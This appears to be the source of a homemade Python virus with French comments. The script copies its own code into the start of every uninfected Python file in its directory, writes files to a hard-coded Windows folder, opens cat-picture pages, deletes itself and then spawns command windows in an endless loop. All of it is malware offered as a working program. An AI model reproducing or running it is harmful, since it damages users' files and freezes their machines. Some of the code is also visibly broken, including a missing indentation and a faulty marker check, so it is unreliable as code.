# VIRUS SAYS HI!
import sys,glob
import itertools,subprocess,sys,os
import time
import webbrowser

import tkinter as tk

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

# VIRUS SAYS BYE!



python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    
    infected = False
    
    # ne pas injecter le code s'il y'a le VIRUS SAYS HI
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break
    
    # injecter le code s'il n'y'a pas le VIRUS SAYS HI
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        
        with open(file, 'w') as f:
            f.writelines(final_code)
            
print ("Virus en cours d'execution")


# VIRUS SAYS BYE!


path = str(os.path.join(r"C:\Users\User\Documents\Virus"))

print(f)


#------------------ création de plein de fichiers texte dans un dossier et affichage de plein de photo de chat sur le navigateur------------------------------
for t in range(6):
    file = open(path +"\\test_%d.txt" %t , "w")
    file.write("let's go !!!%d"%t)
    file.close()
    
    webbrowser.open_new("https://genrandom.com/cats/")
    [''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=1)]
    
    
#-----------------------------------auto supression du virus---------------------------
file_path = r"C:\Users\User\Documents\Virus\virus.py"

if os.path.isfile(file_path):
os.remove(file_path)
print("fichier supprimé")

#--------------------------------Boucle infini qui lance des CMD------------------------------
while True:
    os.system('start cmd')

# VIRUS SAYS BYE!\n

time.sleep(10)